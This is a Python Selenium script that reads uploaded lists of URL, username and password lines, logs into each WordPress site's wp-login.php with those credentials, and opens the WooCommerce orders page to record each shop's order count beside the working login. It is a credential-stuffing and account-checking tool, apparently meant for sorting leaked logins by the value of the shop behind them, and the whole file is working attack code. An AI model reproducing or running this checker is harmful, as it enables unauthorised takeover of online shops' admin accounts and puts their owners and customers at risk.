# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import os
import time

op = Options()
op.add_argument('--headless')
op.add_argument('--no-sandbox')
op.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(ChromeDriverManager().install(), options=op)
output_path = "./output.txt"
def main():
    flag_path = "./flag"
    while True:
        flag_file = open(flag_path, "r+")
        flag = 0
        for line in flag_file:
            flag = line.strip()
            break
        if flag == "1":
            if os.path.exists(output_path):
                output_file = open(output_path, 'w')
                output_file.close()
            scrapAllFiles()
            time.sleep(1)
            flag_file.close()
        time.sleep(5)
        print("File is not uploaded")
        flag_file = open(flag_path, "w")
        flag_file.writelines(['0'])
        flag_file.close()


def scrapAllFiles():
    input_dir = "./upload"
    os.chdir(input_dir)
    files = os.listdir()
    os.chdir('..')
    for file in files:
        if file.endswith('.txt'):
            file_path = f"{input_dir}/{file}"
            scrapOneFile(file_path)

def scrapOneFile(input_path):
    print("scraping in ", input_path)
    try:
        # read csv file
        result = []
        input_file = open(input_path, 'r')
        output_file = open(output_path, 'a')

        for line in input_file:
            oneline = line.strip().split(':')
            username = oneline[3].strip()
            password = oneline[4].strip()
            url = oneline[1].strip() + ":" + oneline[2].strip()
            resultOne = scrapOnePage(url, username, password)
            print(resultOne)
            result.append(resultOne)
        output_file.writelines(result)
        output_file.close()
        input_file.close()
    except:
        print("Unknown format file")

def scrapOnePage(url, username, password):
    print(url)
    print(username, password)
    try:
        driver.get(url)
        # login
        usernameEl = driver.find_element(By.ID, 'user_login')
        if usernameEl != None:
            usernameEl.send_keys(username)
            time.sleep(1)
            passwordEl = driver.find_element(By.ID, "user_pass")
            if passwordEl != None:
                passwordEl.send_keys(password)
                time.sleep(1)
                passwordEl.send_keys(Keys.RETURN)
                time.sleep(1)
                # //*[@id="wpbody-content"]/div[5]/ul/li[1]/a/span
                driver.get(url.replace('wp-login.php', 'wp-admin') + "/edit.php?post_type=shop_order")
                time.sleep(5)
                orderEl = driver.find_element(By.XPATH, '//*[@id="wpbody-content"]/div[5]/ul/li[1]/a/span')
                if orderEl != None:
                    nOrders = orderEl.text.replace('(', '').replace(')', '')
                    if nOrders == "":
                        nOrders = "0"
                    driver.close()
                    return "URL:" + url + ":" + username + ":" + password + " | Orders: " + nOrders + "\n"
                driver.close()
                return "URL:" + url + ":" + username + ":" + password + " | No orders page\n"
            else:
                return "URL:" + url + ":" + username + ":" + password + " | Invalid credential\n"
        else:
            return "URL:" + url + ":" + username + ":" + password + "| can not reach login page\n"
    except:
        return "URL:" + url + ":" + username + ":" + password + " | can not reach the site\n"


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    main()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
